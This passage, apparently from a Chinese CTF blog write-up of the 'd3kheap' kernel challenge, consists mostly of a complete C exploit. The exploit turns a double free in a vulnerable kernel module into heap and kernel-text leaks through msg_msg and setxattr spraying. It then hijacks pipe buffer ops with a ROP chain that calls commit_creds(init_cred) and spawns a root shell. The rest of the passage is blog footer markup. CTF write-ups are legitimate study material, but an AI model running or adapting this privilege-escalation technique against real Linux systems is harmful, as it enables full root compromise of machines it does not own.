class="hljs-number">1</span>];<br>&#125;msg;<br> <br> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span><br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> *next, *prev;<br>&#125;;<br> <br><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">msg_msg</span> <br>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">list_head</span> m_list;<br>    <span class="hljs-type">long</span> m_type;<br>    <span class="hljs-type">size_t</span> m_ts;        <span class="hljs-comment">/* message text size */</span><br>    <span class="hljs-type">void</span> *next;         <span class="hljs-comment">/* struct msg_msgseg *next; */</span><br>    <span class="hljs-type">void</span> *security;     <span class="hljs-comment">/* NULL without SELinux */</span><br>    <span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">size_t</span> *buf;<br>    <span class="hljs-type">size_t</span> kernel_heap_leak = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> kernel_heap_search = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> kernel_text_leak = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> page_offset_base_guess = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> msg_offset, msg_offset_count;<br>    <span class="hljs-type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;<br>    <span class="hljs-type">int</span> kmsg_idx;<br>    <span class="hljs-type">int</span> ms_qid[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">int</span> rop_idx;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    <span class="hljs-built_in">CPU_ZERO</span>(&amp;cpu_set);<br>    <span class="hljs-built_in">CPU_SET</span>(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    <span class="hljs-built_in">sched_setaffinity</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">saveStatus</span>();<br><br>    buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4000</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>);<br><br>    dev_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br><br>    <span class="hljs-built_in">add</span>();<br><br>    <span class="hljs-built_in">del</span>();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        ms_qid[i] = <span class="hljs-built_in">msgget</span>(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>        <span class="hljs-keyword">if</span> (ms_qid[i] &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgget!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-number">0X1000</span> - <span class="hljs-number">8</span>);<br>        ret = <span class="hljs-built_in">msgsnd</span>(ms_qid[i], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgsnd!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">del</span>();<br><br>    <span class="hljs-comment">// leak msg_queue addr from heap</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span>);<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br><br>    ret = <span class="hljs-built_in">msgrcv</span>(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>); i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);<br>        <span class="hljs-keyword">if</span> (((buf[i] &amp; <span class="hljs-number">0xffff000000000000</span>) == <span class="hljs-number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="hljs-number">3</span>] == (<span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>)))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);<br>            kernel_heap_leak = buf[i];<br>            kmsg_idx = (<span class="hljs-type">int</span>)(((<span class="hljs-type">char</span>*)(&amp;buf[i + <span class="hljs-number">2</span>]))[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;A&#x27;</span>);<br>            fake_ops_offset = i * <span class="hljs-number">8</span> + <span class="hljs-number">0x30</span> - <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (((buf[i] &amp; <span class="hljs-number">0xffffffff00000000</span>) == <span class="hljs-number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);<br>            kernel_offset = <span class="hljs-built_in">kernelLeakQuery</span>(buf[i]);<br>            <span class="hljs-keyword">if</span> (kernel_offset != <span class="hljs-number">0xdeadbeef</span>)<br>            &#123;<br>                kernel_text_leak = buf[i];<br>                kernel_base += kernel_offset;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!kernel_heap_leak)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to leak kernel heap!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// leak msg_msg addr</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="hljs-number">8</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br>    ret = <span class="hljs-built_in">msgrcv</span>(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    kmsg_addr = buf[(<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span> + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">/*puts(&quot;[*] leaking...&quot;);</span><br><span class="hljs-comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span><br><span class="hljs-comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span><br>    fake_ops_addr = kmsg_addr - fake_ops_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);<br><br>    <span class="hljs-comment">// leak kernel text base if we didn&#x27;t leak it before</span><br>    kernel_heap_search = kmsg_addr - <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> leaking_times = <span class="hljs-number">0</span>; !kernel_text_leak; leaking_times++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);<br>    <br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);<br><br>        ret = <span class="hljs-built_in">msgrcv</span>(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>            kernel_heap_search += <span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        msg_offset_count = <span class="hljs-number">0</span>;<br>        msg_offset = <span class="hljs-number">0xdeadbeefbad4f00d</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>; i &lt; (<span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);<br>            <span class="hljs-keyword">if</span> ((buf[i] &gt; <span class="hljs-number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="hljs-number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);<br>                kernel_offset = <span class="hljs-built_in">kernelLeakQuery</span>(buf[i]);<br>                <span class="hljs-keyword">if</span> (kernel_offset != <span class="hljs-number">0xdeadbeef</span>)<br>                &#123;<br>                    kernel_text_leak = buf[i];<br>                    kernel_base += kernel_offset;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!buf[i])<br>                msg_offset = msg_offset_count * <span class="hljs-number">8</span>;<br>            msg_offset_count++;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (kernel_text_leak)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (msg_offset == <span class="hljs-number">0xdeadbeefbad4f00d</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Failed to find next valid foothold!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        kernel_heap_search += msg_offset; <span class="hljs-comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span><br>    &#125;<br><br>leak_out:<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="hljs-comment">// a pointer to the heap is available, list_del (aka unlink) is easy to pass</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span><br>    <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br>    ret = <span class="hljs-built_in">msgrcv</span>(ms_qid[kmsg_idx], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="hljs-comment">// add a obj to pass detection in set_freepointer() in free_msg</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    ret = <span class="hljs-built_in">msgrcv</span>(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="hljs-comment">// constructing A-&gt;B-&gt;A</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// regain UAF</span><br>    <span class="hljs-built_in">pipe</span>(pipe_fd);<br>    pipe_fd_1 = pipe_fd[<span class="hljs-number">1</span>];<br><br>    <span class="hljs-built_in">pipe</span>(pipe_fd2);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    buf[<span class="hljs-number">2</span>] = fake_ops_addr;<br>    buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0xffffffff812dbede</span> + kernel_offset; <span class="hljs-comment">// push rsi ; pop rsp ; pop 4 val ; ret</span><br><br>    <span class="hljs-comment">// construct ROP</span><br>    rop_idx = <span class="hljs-number">4</span>;<br>    buf[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    buf[rop_idx++] = INIT_CRED + kernel_offset;<br>    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;<br>    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">0x16</span> + kernel_offset;<br>    buf[rop_idx++] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[rop_idx++] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[rop_idx++] = getRootShell;<br>    buf[rop_idx++] = user_cs;<br>    buf[rop_idx++] = user_rflags;<br>    buf[rop_idx++] = user_sp;<br>    buf[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="hljs-number">2</span>], buf[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">setxattr</span>(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//    sleep(5);</span><br><br>    <span class="hljs-comment">// trigger</span><br>    <span class="hljs-built_in">close</span>(pipe_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(pipe_fd[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>C<br></code></pre></td></tr></table></figure>
+
+<p>不一定每次都能成功（由于开了 freelist 随机化的缘故，我们并不能保证进行 UAF 的 object 往高地址一定会有 msg_msg 结构体），但是经笔者实测成功率还是不低的</p>
+<p><a target="_blank" rel="noopener" href="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png"><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>d3kheap</div>
+      <div>http://example.com/2024/02/15/d3kheap/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>korey0sh1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
